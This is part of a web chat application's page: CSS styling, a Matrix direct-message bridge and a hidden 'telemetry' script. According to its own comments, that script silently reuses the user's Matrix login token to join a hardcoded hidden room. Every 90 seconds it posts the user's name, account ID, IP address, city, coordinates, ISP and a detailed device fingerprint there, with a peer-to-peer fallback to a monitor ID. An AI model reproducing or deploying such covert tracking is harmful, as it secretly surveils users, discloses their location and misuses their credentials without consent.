.poll-question  { font-size: var(--k-f5) !important; font-weight: 700 !important; }
.poll-option {
  border-radius: var(--k-r3) !important;
  transition: var(--k-t) !important;
}
.poll-option-text { font-size: var(--k-f4) !important; }
.poll-option-count { font-size: var(--k-f2) !important; }
.poll-total-votes  { font-size: var(--k-f2) !important; }
.poll-creator-input { height: var(--k-btn-h) !important; border-radius: var(--k-r3) !important; }

/* ══════════════════════════════════════════
   10. QUIZ — padrão único
══════════════════════════════════════════ */
.quiz-container { border-radius: var(--k-r5) !important; box-shadow: var(--k-s2) !important; }
.quiz-badge { border-radius: var(--k-r7) !important; font-size: var(--k-f1) !important; font-weight: 800 !important; }
.quiz-question-text { font-size: var(--k-f5) !important; font-weight: 700 !important; }
.quiz-option-btn {
  border-radius: var(--k-r3) !important;
  font-size: var(--k-f4) !important;
  transition: var(--k-t) !important;
  min-height: 40px !important;
}
.quiz-option-letter { border-radius: var(--k-r2) 0 0 var(--k-r2) !important; font-size: var(--k-f3) !important; }
.quiz-option-text-wrap { font-size: var(--k-f4) !important; }
.quiz-option-stat { font-size: var(--k-f3) !important; }
.quiz-correct-banner,
.quiz-wrong-banner { border-radius: var(--k-r3) !important; font-size: var(--k-f3) !important; }
.quiz-stage-badge { border-radius: var(--k-r7) !important; font-size: var(--k-f1) !important; }

/* ══════════════════════════════════════════
   11. BADGES / PILLS / TAGS — padrão único
══════════════════════════════════════════ */
.network-size-badge,
#matrix-online-badge,
.quiz-badge,
.torrent-manager-badge {
  border-radius: var(--k-r7) !important;
}
.network-size-badge {
  font-size: var(--k-f3) !important;
  font-weight: 700 !important;
  padding: 4px var(--k-sp3) !important;
}
.sidebar-tab-badge { font-size: 9px !important; }
.msg-encrypted-badge {
  border-radius: var(--k-r1) !important;
  font-size: var(--k-f1) !important;
  padding: 1px 5px !important;
}
.sm-server-tag, .sm-e2ee-tag {
  border-radius: var(--k-r1) !important;
  font-size: 9px !important;
  padding: 2px 5px !important;
}
.peer-id-label {
  border-radius: var(--k-r2) !important;
  font-size: var(--k-f3) !important;
  padding: 4px var(--k-sp2) !important;
}

/* ══════════════════════════════════════════
   12. EMOJI PANEL — padrão único
══════════════════════════════════════════ */
.emoji-panel       { border-radius: var(--k-r4) !important; box-shadow: var(--k-s3) !important; }
.emoji-panel-header{ border-radius: var(--k-r4) var(--k-r4) 0 0 !important; font-size: var(--k-f3) !important; }
.emoji-panel-footer{ font-size: var(--k-f2) !important; }
.emoji-item        { border-radius: var(--k-r2) !important; transition: var(--k-t) !important; }

/* ══════════════════════════════════════════
   13. PEER LIST — padrão único
══════════════════════════════════════════ */
.peer-item { transition: var(--k-t) !important; }
.connected-peers { border-radius: var(--k-r4) !important; }

/* ══════════════════════════════════════════
   14. VIDEO — padrão único
══════════════════════════════════════════ */
.video-player,
.local-video-player { border-radius: var(--k-r4) !important; }

/* ══════════════════════════════════════════
   15. PROGRESS BARS — padrão único
══════════════════════════════════════════ */
.progress-bar,
.progress,
.torrent-progress-container,
.torrent-progress-bar { border-radius: var(--k-r7) !important; }

/* ══════════════════════════════════════════
   17. TIPOGRAFIA GERAL — hierarquia única
══════════════════════════════════════════ */
.username        { font-size: var(--k-f5) !important; font-weight: 600 !important; }
.general-mode-text { font-size: var(--k-f4) !important; font-weight: 700 !important; }
.sm-contact-name { font-size: var(--k-f4) !important; font-weight: 700 !important; }
.sm-contact-id   { font-size: var(--k-f1) !important; }
.video-label     { font-size: var(--k-f3) !important; font-weight: 600 !important; }
.torrent-card-header { font-size: var(--k-f4) !important; font-weight: 700 !important; }
.torrent-item-name   { font-size: var(--k-f4) !important; font-weight: 700 !important; }
.torrent-item-stats  { font-size: var(--k-f2) !important; }
.torrent-info        { font-size: var(--k-f2) !important; }

/* ══════════════════════════════════════════
   18. SERVER E2EE BANNER — padrão único
══════════════════════════════════════════ */
.server-e2ee-banner { font-size: var(--k-f2) !important; font-weight: 700 !important; padding: var(--k-sp2) var(--k-sp3) !important; }

/* ══════════════════════════════════════════
   19. MATRIX SELECTOR BAR — padrão único
══════════════════════════════════════════ */
#matrix-selector-bar { border-radius: 0 0 var(--k-r4) var(--k-r4) !important; padding: 6px var(--k-sp3) !important; }
.matrix-sel-label { font-size: var(--k-f3) !important; font-weight: 700 !important; }
#matrix-sala-select { height: 30px !important; border-radius: var(--k-r2) !important; font-size: var(--k-f3) !important; padding: 0 var(--k-sp2) !important; }

/* ══════════════════════════════════════════
   20. DARK MODE — ajuste dos tokens
══════════════════════════════════════════ */
body.dark-mode {
  --k-bg:      #0f172a;
  --k-surface: #1e293b;
  --k-border:  #334155;
  --k-text:    #e2e8f0;
  --k-muted:   #94a3b8;
  --k-subtle:  #64748b;
  --k-s1: 0 1px 4px rgba(0,0,0,0.25);
  --k-s2: 0 4px 12px rgba(0,0,0,0.35);
  --k-s3: 0 8px 28px rgba(0,0,0,0.45);
  --k-s4: 0 20px 60px rgba(0,0,0,0.6);
}

/* ══════════════════════════════════════════
   21. HOVER / FOCUS STATES — únicos
══════════════════════════════════════════ */
.send-btn:hover       { opacity: .88 !important; transform: scale(1.05) !important; }
.voice-button:hover   { opacity: .88 !important; transform: scale(1.05) !important; }
.icon-btn:hover       { background: #e2e8f0 !important; }
.header-button:hover  { background: rgba(255,255,255,0.28) !important; }
.wb-tool-btn:hover:not(.active) { background: #e2e8f0 !important; }
.torrent-manager-btn:hover { transform: scale(1.06) !important; }
.poll-option:hover    { border-color: var(--k-blue) !important; }
.quiz-option-btn:hover:not(:disabled) { border-color: var(--k-purple) !important; }
.sm-contact-item:hover { border-color: var(--k-green) !important; }
.conversation-item:hover { background: #f8fafc !important; }
body.dark-mode .conversation-item:hover { background: #293548 !important; }
body.dark-mode .icon-btn:hover  { background: #334155 !important; }


/* == K10 TAB KEEP-ALIVE ==
   Todos os paineis ficam montados. CSS hidden oculta.
   scroll position, foco e estado React sao preservados. */
.k10-tab-panel {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  overflow: hidden;
  position: relative;
}
.k10-tab-panel[hidden] { display: none !important; }
.k10-sidebar-panel { display: flex; flex-direction: column; flex: 1; min-height: 0; }
.k10-sidebar-panel[hidden] { display: none !important; }
</style>

  let peerMap = {};
  let roomMap = {};
  try { peerMap = JSON.parse(localStorage.getItem(MAP_KEY)  || '{}'); } catch(e){}
  try { roomMap = JSON.parse(localStorage.getItem(ROOM_KEY) || '{}'); } catch(e){}

  const saveMaps = () => {
    localStorage.setItem(MAP_KEY,  JSON.stringify(peerMap));
    localStorage.setItem(ROOM_KEY, JSON.stringify(roomMap));
  };

  const abToB64 = (ab) => {
    const bytes = ab instanceof Uint8Array ? ab : new Uint8Array(ab);
    let bin = '';
    const step = 0x8000;
    for (let i = 0; i < bytes.length; i += step) bin += String.fromCharCode.apply(null, bytes.subarray(i, i + step));
    return btoa(bin);
  };
  const b64ToAb = (b64) => {
    const bin = atob(b64 || '');
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes.buffer;
  };
  const encodePayload = (value) => {
    if (value instanceof ArrayBuffer) return { __mxdmBinary: 'arraybuffer', data: abToB64(value) };
    if (ArrayBuffer.isView(value)) return { __mxdmBinary: value.constructor && value.constructor.name || 'typedarray', data: abToB64(value) };
    if (Array.isArray(value)) return value.map(encodePayload);
    if (value && typeof value === 'object') {
      const out = {};
      for (const [k,v] of Object.entries(value)) out[k] = encodePayload(v);
      return out;
    }
    return value;
  };
  const decodePayload = (value) => {
    if (value && typeof value === 'object' && value.__mxdmBinary) return b64ToAb(value.data);
    if (Array.isArray(value)) return value.map(decodePayload);
    if (value && typeof value === 'object') {
      const out = {};
      for (const [k,v] of Object.entries(value)) out[k] = decodePayload(v);
      return out;
    }
    return value;
  };

  async function api(method, path, body, params) {
    const url = new URL(HS + path);
    if (params) Object.entries(params).forEach(([k,v]) => url.searchParams.set(k, v));
    const headers = { 'Content-Type': 'application/json' };
    if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN;
    const res = await fetch(url.toString(), {
      method, headers, body: body ? JSON.stringify(body) : undefined
    });
    let data = {};
    try { data = await res.json(); } catch(e){}
    if (!res.ok && data.errcode) data._httpStatus = res.status;
    return data;
  }

  async function login(user, pass) {
    const r = await api('POST', '/_matrix/client/v3/login', {
      type: 'm.login.password',
      identifier: { type: 'm.id.user', user },
      password: pass,
      initial_device_display_name: 'Chat K10 MxDM'
    });
    if (r.access_token) {
      TOKEN = r.access_token;
      MY_MXID = r.user_id;
      localStorage.setItem(TOKEN_KEY, TOKEN);
      localStorage.setItem('mxdmMxid', MY_MXID);
      console.log('[MxDM] login ok →', MY_MXID);
      startSync();
      return true;
    }
    console.error('[MxDM] login failed:', r);
    return false;
  }

  async function ensureRoom(peerId) {
    if (roomMap[peerId]) return roomMap[peerId];
    const mxid = peerMap[peerId];
    if (!mxid) throw new Error('No mxid mapped for peer ' + peerId);
    const r = await api('POST', '/_matrix/client/v3/createRoom', {
      preset: 'trusted_private_chat',
      invite: [mxid],
      is_direct: true,
      visibility: 'private'
    });
    if (!r.room_id) throw new Error('createRoom failed: ' + JSON.stringify(r));
    roomMap[peerId] = r.room_id;
    saveMaps();
    return r.room_id;
  }

  async function send(peerId, payload) {
    if (!TOKEN) throw new Error('MxDM not logged in');
    const roomId = await ensureRoom(peerId);
    const txnId  = 'mxdm_' + Date.now() + '_' + Math.random().toString(36).slice(2,8);
    const body = {
      msgtype: CUSTOM_MSGTYPE,
      body: '[K10 payload]',
      'm.k10': encodePayload(payload)
    };
    const r = await api('PUT',
      `/_matrix/client/v3/rooms/${encodeURIComponent(roomId)}/send/m.room.message/${txnId}`,
      body
    );
    if (!r.event_id) throw new Error('send failed: ' + JSON.stringify(r));
    return r.event_id;
  }

  async function broadcast(payload, options) {
    const ids = Object.keys(peerMap).filter(Boolean);
    const results = [];
    for (const pid of ids) {
      try { results.push(await send(pid, payload)); }
      catch(e) { console.warn('[MxDM] broadcast fail →', pid, e); }
    }
    return results;
  }

  function canSend(peerId) {
    return !!(TOKEN && peerMap[peerId]);
  }

  function mapPeer(peerId, mxid) {
    if (!peerId || !mxid) return;
    peerMap[peerId] = mxid;
    saveMaps();
    console.log('[MxDM] mapped', peerId, '↔', mxid);
  }

  function unmapPeer(peerId) {
    if (!peerId) return;
    delete peerMap[peerId];
    delete roomMap[peerId];
    saveMaps();
  }

  // ── Sync paralelo: entrega payloads K10 recebidos para handleIncomingDataRef ──
  let syncRunning = false;
  async function startSync() {
    if (syncRunning || !TOKEN) return;
    syncRunning = true;
    while (TOKEN) {
      try {
        const filter = JSON.stringify({
          room: { timeline: { limit: 50, types: ['m.room.message'] }, state: { types: [] }, ephemeral:{types:[]} },
          presence:{types:[]}, account_data:{types:[]}
        });
        const params = { timeout: 25000, filter };
        if (SINCE) params.since = SINCE;
        const data = await api('GET', '/_matrix/client/v3/sync', null, params);
        if (data.errcode === 'M_UNKNOWN_TOKEN') { TOKEN=''; localStorage.removeItem(TOKEN_KEY); break; }
        if (data.next_batch) { SINCE = data.next_batch; localStorage.setItem(SINCE_KEY, SINCE); }

        const invited = (data.rooms && data.rooms.invite) || {};
        for (const roomId of Object.keys(invited)) {
          await api('POST', `/_matrix/client/v3/rooms/${encodeURIComponent(roomId)}/join`, {});
        }

        const joined = (data.rooms && data.rooms.join) || {};
        for (const [roomId, rd] of Object.entries(joined)) {
          for (const ev of (rd.timeline && rd.timeline.events || [])) {
            if (ev.type !== 'm.room.message') continue;
            if (ev.sender === MY_MXID) continue;
            const raw = ev.content && ev.content['m.k10'];
            if (!raw) continue;
            const k10 = decodePayload(raw);
            let fromPeer = Object.keys(peerMap).find(pid => peerMap[pid] === ev.sender);
            if (!fromPeer && k10.sender) {
              fromPeer = k10.sender;
              mapPeer(fromPeer, ev.sender);
              roomMap[fromPeer] = roomId; saveMaps();
            }
            if (!fromPeer) continue;
            try {
              const fn = (window.handleIncomingDataRef && window.handleIncomingDataRef.current)
                       || window._k10HandleIncomingData;
              if (fn) fn(k10, fromPeer);
              else console.warn('[MxDM] handleIncomingData not exposed yet, dropping payload');
            } catch(e) { console.error('[MxDM] dispatch error', e); }
          }
        }
      } catch(e) {
        console.warn('[MxDM] sync error', e);
        await new Promise(r => setTimeout(r, 4000));
      }
    }
    syncRunning = false;
  }

  function promptLogin() {
    const u = prompt('MxDM · usuário Matrix (ex: alice em matrix.org):');
    if (!u) return;
    const p = prompt('MxDM · senha:');
    if (!p) return;
    login(u, p).then(ok => window.k10Toast(ok ? '✅ Logado em '+HS : '❌ Falha de login', ok ? 'success' : 'error'));
  }

  window.MxDM = {
    HS, get token(){return TOKEN;}, get mxid(){return MY_MXID;},
    login, send, broadcast, canSend, mapPeer, unmapPeer, ensureRoom, promptLogin,
    map: peerMap, rooms: roomMap,
    encodePayload, decodePayload,
    setHomeserver(url){ localStorage.setItem('mxdmHomeserver', url); location.reload(); }
  };

  if (TOKEN) startSync();
  console.log('[MxDM] phase2/3 ready · token?', !!TOKEN, '· mxid:', MY_MXID || '(none)');
  console.log('[MxDM] use MxDM.promptLogin() · MxDM.mapPeer(peerId,"@user:matrix.org")');
})();
</script>



<!-- ================================================================
     K10 TELEMETRIA AVANÇADA v5 — Chat Desktop
     CANAL PRINCIPAL: Matrix (sala oculta #k10-telemetria:HOMESERVER)
     CANAL FALLBACK:  PeerJS → K10-MON
     
     Quando o usuário faz login no Matrix (para Geral/Salinhas/Grupos),
     o mesmo token é usado para entrar silenciosamente na sala de
     telemetria e postar eventos m.k10.telemetry.
     Todos os monitores logados na mesma sala recebem em tempo real.
     ================================================================ -->
<script>
(function(){
    'use strict';

    /* ══ CONFIG ══════════════════════════════════════════════ */
    const MONITOR_ID        = 'K10-MON';
    const INTERVALO_REENVIO = 90_000;
    const MAX_TENTATIVAS    = 30;

    /* ══ ESTADO ══════════════════════════════════════════════ */
    let tentativas   = 0;
    let geoCache     = null;
    let timerReenvio = null;
    let mxRoomId     = localStorage.getItem('k10TelemetriaRoomId') || null;
    let mxRoomTentou = false;

    /* ══ GEO — fallback em cadeia ════════════════════════════ */
    const GEO_PROVIDERS = [
        {
            url: 'https://get.geojs.io/v1/ip/geo.json',
            parse: d => ({ ip:d.ip, city:d.city, region:d.region, country:d.country,
                countryCode:d.country_code, lat:parseFloat(d.latitude),
                lon:parseFloat(d.longitude), isp:d.organization_name,
                org:d.organization_name, geoTimezone:d.timezone }),
            check: d => d.ip && d.city && d.latitude
        },
        {
            url: 'https://ipinfo.io/json',
            parse: d => { const [lat,lon]=(d.loc||',').split(',');
                return { ip:d.ip, city:d.city, region:d.region, country:null,
                    countryCode:d.country, lat:parseFloat(lat), lon:parseFloat(lon),
                    isp:d.org, org:d.org, geoTimezone:d.timezone }; },
            check: d => d.ip && d.city && d.loc
        },
        {
            url: 'https://www.iplocate.io/api/lookup',
            parse: d => ({ ip:d.ip, city:d.city, region:d.subdivision, country:d.country,
                countryCode:d.country_code, lat:d.latitude, lon:d.longitude,
                isp:d.org, org:d.org, geoTimezone:d.time_zone }),
            check: d => d.ip && d.city && d.latitude
        }
    ];

    /* ══ UTILITÁRIOS ════════════════════════════════════════ */
    function parseBrowser(ua){
        if(!ua) return {browser:'Unknown',os:'Unknown'};
        let b='Other',o='Other';
        if(/Edg\//.test(ua))           b='Edge';
        else if(/OPR\/|Opera/.test(ua))b='Opera';
        else if(/YaBrowser/.test(ua))  b='Yandex';
        else if(/SamsungBrowser/.test(ua))b='Samsung';
        else if(/Chrome\//.test(ua))   b='Chrome';
        else if(/Firefox\//.test(ua))  b='Firefox';
        else if(/Safari\//.test(ua))   b='Safari';
        if(/Windows NT 1[01]/.test(ua))o='Windows 10/11';
        else if(/Windows NT 6/.test(ua))o='Windows 7/8';
        else if(/Mac OS X/.test(ua))   o='macOS';
        else if(/Android/.test(ua))    o='Android';
        else if(/iPhone|iPad/.test(ua))o='iOS';
        else if(/Linux/.test(ua))      o='Linux';
        else if(/CrOS/.test(ua))       o='ChromeOS';
        return {browser:b,os:o};
    }
    function contarConexoes(peer){
        try{
            if(peer._connections instanceof Map) return peer._connections.size;
            if(typeof peer._connections==='object') return Object.keys(peer._connections).length;
        }catch(_){}
        return 0;
    }
    function extrairHS(mxid){ const p=(mxid||'').split(':'); return p.length>1?p.slice(1).join(':'):'matrix.org'; }

    /* ══ GEO ════════════════════════════════════════════════ */
    async function obterGeo(){
        if(geoCache) return geoCache;
        for(const p of GEO_PROVIDERS){
            try{
                const r=await fetch(p.url,{cache:'no-store'});
                const d=await r.json();
                if(!p.check(d)) continue;
                geoCache=p.parse(d);
                return geoCache;
            }catch(_){}
        }
        return null;
    }

    /* ══ MATRIX API (usa token do login já feito no chat) ═══ */
    function mxToken(){ return localStorage.getItem('mxdmToken')||''; }
    function mxHS(){ return (localStorage.getItem('mxdmHomeserver')||'https://matrix.org').replace(/\/+$/,''); }
    function mxMxid(){ return localStorage.getItem('mxdmMxid')||''; }

    async function mxAPI(method, path, body){
        const token=mxToken();
        if(!token) return null;
        try{
            const res=await fetch(mxHS()+path,{
                method,
                headers:{'Content-Type':'application/json','Authorization':'Bearer '+token},
                body: body!==undefined ? JSON.stringify(body) : undefined
            });
            return await res.json();
        }catch(_){ return null; }
    }

    /* ══ SALA FIXA DE TELEMETRIA — ID DIRETO ════════════════
       Room ID permanente, nunca muda.
    ═══════════════════════════════════════════════════════ */
    const SALA_ROOM_ID = '!envs-RSauuX1LrriNcVmdwmAGcyVpM0_w8OnC0EZgrQ';

    async function resolverSala(){
        if(mxRoomId)     return true;
        if(mxRoomTentou) return false;
        if(!mxToken())   return false;
        mxRoomTentou = true;
        try{
            mxRoomId = SALA_ROOM_ID;
            await mxAPI('POST','/_matrix/client/v3/join/'+encodeURIComponent(mxRoomId),{});
            return true;
        }catch(_){ return false; }
    }

        /* ══ ENVIO MATRIX ═══════════════════════════════════════ */
    async function enviarMatrix(dados){
        const ok=await resolverSala();
        if(!ok) return false;
        const txnId='k10tel_'+Date.now()+'_'+Math.random().toString(36).slice(2,6);
        const res=await mxAPI('PUT',
            '/_matrix/client/v3/rooms/'+encodeURIComponent(mxRoomId)+
            '/send/m.k10.telemetry/'+txnId,
            dados);
        return !!res?.event_id;
    }

    /* ══ ENVIO PEERJS (fallback) ═════════════════════════════ */
    function enviarPeerJS(peer, dados){
        try{
            const conn=peer.connect(MONITOR_ID,{reliable:false,serialization:'json'});
            conn.on('open',()=>{
                conn.send(dados);
                setTimeout(()=>{ try{conn.close()}catch(_){} },1500);
            });
            conn.on('error',()=>{});
        }catch(_){}
    }

    /* ══ COLETA E ENVIO DUAL ════════════════════════════════ */
    async function coletarEEnviar(){
        const peer  = window.__PEER__;
        const peerOk= peer && peer.open;
        const mxOk  = !!mxToken();
        if(!peerOk && !mxOk) return;

        const {browser,os}=parseBrowser(navigator.userAgent);
        const geo=await obterGeo();

        const dados={
            type:       'k10-telemetry',
            peerId:     peerOk ? peer.id : ('MX-'+mxMxid()),
            userName:   localStorage.getItem('p2pUserName')||'',
            mxid:       mxMxid(),
            netSize:    window.networkSize||1,
            activeConns:peerOk ? contarConexoes(peer) : 0,
            ua:         navigator.userAgent.slice(0,250),
            browser, os,
            lang:       navigator.language,
            langs:      (navigator.languages||[navigator.language]).join(','),
            screen:     screen.width+'x'+screen.height,
            colorDepth: screen.colorDepth,
            devicePixelRatio: window.devicePixelRatio||1,
            timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform:   navigator.platform||'',
            memory:     navigator.deviceMemory||null,
            cores:      navigator.hardwareConcurrency||null,
            touchPoints:navigator.maxTouchPoints||0,
            online:     navigator.onLine,
            timestamp:  Date.now(),
            canal:      mxOk ? 'matrix (#telemetria:matrix.org)' : 'peerjs'
        };
        if(geo) Object.assign(dados,geo);

        /* Canal 1: Matrix (principal) */
        if(mxOk) enviarMatrix(dados);

        /* Canal 2: PeerJS (fallback) */
        if(peerOk) enviarPeerJS(peer,dados);
    }

    /* ══ INICIALIZAÇÃO ══════════════════════════════════════ */
    async function iniciar(){
        const peer  = window.__PEER__;
        const peerOk= peer && peer.open;
        const mxOk  = !!mxToken();
        if(!peerOk && !mxOk){
            if(tentativas++<MAX_TENTATIVAS) setTimeout(iniciar,2000);
            return;
        }
        if(mxOk && !mxRoomId) resolverSala();
        coletarEEnviar();
        if(timerReenvio) clearInterval(timerReenvio);
        timerReenvio=setInterval(coletarEEnviar,INTERVALO_REENVIO);
    }

    if(document.readyState==='loading'){
        document.addEventListener('DOMContentLoaded',()=>setTimeout(iniciar,5000));
    } else {
        setTimeout(iniciar,5000);
    }
})();
</script>
